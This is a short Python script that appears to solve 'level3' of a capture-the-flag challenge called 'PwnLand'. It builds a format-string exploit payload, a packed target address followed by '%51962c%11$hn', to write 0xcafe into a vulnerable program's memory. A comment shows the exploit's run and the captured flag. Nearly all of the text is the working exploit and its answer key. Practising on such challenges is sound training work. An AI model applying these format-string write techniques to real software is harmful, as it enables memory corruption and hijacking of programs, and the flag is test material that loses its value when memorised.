import struct


'''

0xcafe - 4 = 51962


$  python level3.py| ./level3
-- snip -- 

Wow, you got it!
PwnLand{f0rm4t_Str1ngs}

'''

print(struct.pack("<I", 0x804a04c) + "%51962c"+ "%11$hn")


